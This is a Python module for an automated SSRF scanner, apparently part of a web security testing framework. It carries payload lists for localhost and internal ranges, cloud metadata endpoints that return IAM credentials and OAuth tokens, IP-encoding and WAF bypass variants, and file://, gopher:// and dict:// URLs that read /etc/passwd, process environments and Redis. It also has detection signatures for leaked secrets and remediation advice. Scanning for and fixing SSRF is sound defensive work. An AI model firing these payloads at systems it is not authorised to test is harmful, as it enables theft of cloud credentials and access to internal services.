"""SSRF Scanner — Deep, multi-vector server-side request forgery detection.

Covers:
  - Internal network access (127.0.0.1, localhost, 0.0.0.0)
  - Cloud metadata (AWS, GCP, Azure, Alibaba, DigitalOcean, Oracle Cloud)
  - IPv6 variants (::1, [::1], 0000::1)
  - IP encoding bypass (decimal, octal, hex, mixed)
  - URL scheme attacks (gopher, dict, file, jar)
  - DNS rebinding markers
  - POST body, JSON body, and header injection
  - WAF bypass variants
"""
from __future__ import annotations
import asyncio, re
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# ── Internal Network Payloads ─────────────────────────────────

INTERNAL_PAYLOADS = [
    # Standard localhost
    "http://127.0.0.1/", "http://localhost/", "http://0.0.0.0/",
    "http://127.0.0.1:80/", "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/", "http://127.0.0.1:3000/",
    "http://127.0.0.1:22/", "http://127.0.0.1:6379/",  # SSH, Redis
    # IPv6
    "http://[::1]/", "http://[0000::1]/", "http://[::ffff:127.0.0.1]/",
    # IP encoding bypass
    "http://0x7f000001/",          # Hex
    "http://2130706433/",          # Decimal
    "http://0177.0.0.1/",         # Octal
    "http://127.1/",              # Short form
    "http://127.0.1/",
    "http://0/",
    "http://0.0.0.0:0/",
    # Enclosed alphanumerics
    "http://①②⑦.⓪.⓪.①/",
    # URL encoding
    "http://%31%32%37%2e%30%2e%30%2e%31/",
    # Double URL encoding
    "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/",
    # Internal ranges
    "http://10.0.0.1/", "http://172.16.0.1/", "http://192.168.0.1/",
    "http://192.168.1.1/", "http://10.10.10.10/",
]

# ── Cloud Metadata Payloads ───────────────────────────────────

CLOUD_PAYLOADS = [
    # AWS IMDSv1
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata", ["ami-id", "instance-id", "iam", "security-credentials", "hostname", "public-keys"]),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds", ["AccessKeyId", "SecretAccessKey", "Token"]),
    ("http://169.254.169.254/latest/user-data/", "AWS user-data", ["#!/", "cloud-init", "password"]),
    ("http://169.254.169.254/latest/dynamic/instance-identity/document", "AWS identity", ["instanceId", "region", "accountId"]),
    # GCP
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata", ["computeMetadata"]),
    ("http://169.254.169.254/computeMetadata/v1/project/project-id", "GCP project", ["projects/"]),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP token", ["access_token"]),
    # Azure
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata", ["compute", "azEnvironment"]),
    ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure token", ["access_token"]),
    # Alibaba Cloud
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata", ["instance-id", "eipAddress"]),
    # DigitalOcean
    ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata", ["droplet_id", "hostname"]),
    # Oracle Cloud
    ("http://169.254.169.254/opc/v1/instance/", "Oracle Cloud metadata", ["availabilityDomain", "compartmentId"]),
]

# ── URL Scheme Attacks ────────────────────────────────────────

SCHEME_PAYLOADS = [
    ("file:///etc/passwd", "file:// protocol", ["root:x:0", "root:.*:/bin"]),
    ("file:///etc/hostname", "file:// hostname", []),
    ("file:///proc/self/environ", "file:// environ", ["PATH=", "HOME=", "HOSTNAME="]),
    ("file:///proc/self/cmdline", "file:// cmdline", []),
    ("file:///C:/Windows/win.ini", "file:// Windows", ["[fonts]", "[extensions]"]),
    ("gopher://127.0.0.1:6379/_INFO", "gopher Redis", ["redis_version"]),
    ("dict://127.0.0.1:6379/INFO", "dict Redis", ["redis_version"]),
]

# ── Parameters likely to trigger SSRF ─────────────────────────

SSRF_URL_PARAMS = {
    "url", "uri", "path", "src", "source", "dest", "destination",
    "redirect", "next", "data", "reference", "site", "html", "callback",
    "return", "view", "image", "img", "load", "fetch", "request",
    "feed", "host", "proxy", "link", "href", "page", "file",
    "document", "domain", "endpoint", "api", "target", "to",
    "u", "resource", "download", "content", "val", "validate",
    "ping", "webhook", "rurl", "forward",
}

# ── Internal Signatures ───────────────────────────────────────

INTERNAL_SIGS = [
    r"root:x:0:0", r"root:.*:/bin/(bash|sh)", r"SSH-\d",
    r"redis_version", r"\[fonts\]", r"\[extensions\]",
    r"AMI ID", r"ami-[a-f0-9]+", r"instance-id", r"i-[a-f0-9]+",
    r"computeMetadata", r"iam/security-credentials",
    r"AccessKeyId", r"SecretAccessKey", r"access_token",
    r"availabilityDomain", r"compartmentId",
    r"droplet_id", r"azEnvironment",
    r"PATH=", r"HOME=", r"HOSTNAME=",
    r"<title>.*Apache.*Status</title>",
    r"Server:.*nginx", r"Server:.*Apache",
    r"220.*FTP", r"MySQL.*native",
]

CLOUD_METADATA_MARKERS = [
    "169.254.169.254", "metadata.google.internal", "metadata.azure",
    "100.100.100.200", "169.254.170.2",
]

REMEDIATION = (
    "Validate and sanitize all user-supplied URLs. Use an allowlist of permitted "
    "domains and protocols. Block requests to private IP ranges (10.x, 172.16-31.x, "
    "192.168.x, 127.x, ::1, 169.254.x). Disable unnecessary URL schemes. "
    "Use IMDSv2 (require PUT token) to protect cloud metadata. "
    "Deploy network-level controls to prevent the application from accessing internal services."
)


class SSRFScanner(BaseScanner):
    name = "ssrf"
    description = "Detects SSRF including cloud metadata, internal services, and URL scheme attacks"
    tags = ["ssrf", "owasp-a10"]

    @staticmethod
    def _is_cloud_payload(payload: str) -> bool:
        return any(marker in payload for marker in CLOUD_METADATA_MARKERS)

    async def run(self, state: ScanState) -> List[Finding]:
        filter_cloud = state.target.metadata.get("filter_cloud_payloads", False)
        findings = []
        seen = set()
        tasks = []

        for url, params in state.target.discovered_params.items():
            for param in params:
                is_url_param = param.lower() in SSRF_URL_PARAMS

                if is_url_param:
                    # Full test suite for URL-like parameters
                    tasks.append(self._test_internal(url, param, "GET", "query", filter_cloud))
                    tasks.append(self._test_cloud(url, param, "GET", "query", filter_cloud))
                    tasks.append(self._test_schemes(url, param, "GET", "query"))
                    # POST injection
                    tasks.append(self._test_internal(url, param, "POST", "body", filter_cloud))
                    # JSON injection
                    tasks.append(self._test_internal(url, param, "POST", "json", filter_cloud))
                else:
                    # Only test cloud metadata for non-URL params (high-value, low-noise)
                    if not filter_cloud:
                        tasks.append(self._test_cloud(url, param, "GET", "query", filter_cloud))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
            elif isinstance(r, list):
                for f in r:
                    key = (f.url, f.parameter, f.vuln_type)
                    if key not in seen:
                        seen.add(key)
                        findings.append(f)
        return findings

    async def _test_internal(self, url, param, method, inject_in, filter_cloud) -> List[Finding]:
        findings = []
        for payload in INTERNAL_PAYLOADS:
            for variant in self.get_waf_bypass_variants(payload, "ssrf"):
                resp, raw_req = await self.test_payload(url, method, param, variant, inject_in=inject_in)
                if resp is None:
                    continue
                for sig in INTERNAL_SIGS:
                    m = re.search(sig, resp.text, re.IGNORECASE)
                    if m:
                        findings.append(self.make_finding(
                            title=f"Internal SSRF via '{param}'",
                            vuln_type="ssrf_internal", severity=Severity.HIGH,
                            url=url, parameter=param, method=method, payload=variant,
                            evidence=f"Internal signature: {m.group(0)}",
                            request=raw_req, response=resp.text[:500],
                            cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                            description=(
                                f"Parameter '{param}' ({method} {inject_in}) performs server-side "
                                f"requests to internal resources. Payload: {variant}"
                            ),
                            remediation=REMEDIATION,
                            poc_steps=[
                                f"1. Set '{param}' to {variant}",
                                "2. Server fetches internal resource",
                                f"3. Internal signature in response: {m.group(0)}",
                                "4. Escalate: port scan, read internal files, access APIs",
                            ],
                        ))
                        return findings
        return findings

    async def _test_cloud(self, url, param, method, inject_in, filter_cloud) -> List[Finding]:
        findings = []
        for payload, cloud_name, markers in CLOUD_PAYLOADS:
            if filter_cloud and self._is_cloud_payload(payload):
                continue

            extra_headers = {}
            if "google" in payload:
                extra_headers = {"Metadata-Flavor": "Google"}

            resp, raw_req = await self.test_payload(
                url, method, param, payload, inject_in=inject_in,
                extra_headers=extra_headers if extra_headers else None,
            )
            if resp is None:
                continue

            body = resp.text
            for marker in markers:
                if marker.lower() in body.lower():
                    findings.append(self.make_finding(
                        title=f"Cloud Metadata SSRF ({cloud_name}) via '{param}'",
                        vuln_type="ssrf_cloud_metadata", severity=Severity.CRITICAL,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=f"Cloud marker '{marker}' found in response",
                        request=raw_req, response=body[:500],
                        cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                        description=(
                            f"Parameter '{param}' allows SSRF to {cloud_name} endpoint. "
                            f"Attacker can steal cloud credentials, access internal APIs, "
                            f"and potentially compromise the entire cloud account."
                        ),
                        remediation=REMEDIATION,
                        poc_steps=[
                            f"1. Set '{param}' to {payload}",
                            f"2. Server fetches {cloud_name} endpoint",
                            f"3. Response contains: {marker}",
                            "4. Escalate: extract IAM credentials → full cloud compromise",
                        ],
                    ))
                    return findings

            # Generic check for any internal signatures
            for sig in INTERNAL_SIGS:
                m = re.search(sig, body, re.IGNORECASE)
                if m:
                    findings.append(self.make_finding(
                        title=f"Cloud Metadata SSRF ({cloud_name}) via '{param}'",
                        vuln_type="ssrf_cloud_metadata", severity=Severity.CRITICAL,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=f"Internal signature: {m.group(0)}",
                        request=raw_req, response=body[:500],
                        cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                        description=f"SSRF to {cloud_name} — internal data exposed.",
                        remediation=REMEDIATION,
                    ))
                    return findings
        return findings

    async def _test_schemes(self, url, param, method, inject_in) -> List[Finding]:
        findings = []
        for payload, scheme_name, markers in SCHEME_PAYLOADS:
            resp, raw_req = await self.test_payload(url, method, param, payload, inject_in=inject_in)
            if resp is None:
                continue
            body = resp.text
            for marker in markers:
                # Most scheme markers are literal response fragments.  Treat
                # only the explicitly regex-shaped root marker as a regex so
                # strings such as ``[fonts]`` cannot become a character class.
                if ".*" in marker:
                    m = re.search(marker, body, re.IGNORECASE)
                else:
                    index = body.lower().find(marker.lower())
                    m = re.search(re.escape(marker), body, re.IGNORECASE) if index >= 0 else None
                if m:
                    findings.append(self.make_finding(
                        title=f"SSRF via {scheme_name} in '{param}'",
                        vuln_type="ssrf_scheme", severity=Severity.HIGH,
                        url=url, parameter=param, method=method, payload=payload,
                        evidence=f"Scheme response: {m.group(0)}",
                        request=raw_req, response=body[:500],
                        cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                        description=f"Parameter '{param}' accepts {scheme_name} URLs.",
                        remediation=REMEDIATION,
                    ))
                    return findings
            # For schemes without specific markers, check for any meaningful response
            if not markers and len(body) > 100 and resp.status_code == 200:
                findings.append(self.make_finding(
                    title=f"Potential SSRF via {scheme_name} in '{param}'",
                    vuln_type="ssrf_scheme", severity=Severity.MEDIUM,
                    url=url, parameter=param, method=method, payload=payload,
                    evidence=f"Non-empty response ({len(body)}B) for {scheme_name}",
                    request=raw_req, response=body[:300],
                    cwe_id="CWE-918", owasp_category="A10:2021 - SSRF",
                    description=f"Server may process {scheme_name} URLs.",
                    remediation=REMEDIATION,
                ))
        return findings
